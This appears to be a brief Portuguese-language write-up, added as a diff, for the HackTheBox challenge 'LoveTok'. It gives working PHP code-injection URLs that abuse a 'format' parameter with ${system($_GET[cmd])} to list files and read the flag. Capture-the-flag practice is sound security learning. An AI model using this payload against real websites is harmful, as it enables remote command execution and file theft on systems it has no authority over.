@@ -1,0 +1,9 @@
+LoveTok - HackThebox
+
+o site há um RCE, então vamos pwnar
+https://site.com/?format=r
+
+rodando:
+https://site.com/?format=${system($_GET[cmd])}&cmd=ls
+
+https://site.com/?format=${system($_GET[cmd])}&cmd=cat%20../flagmRG8b
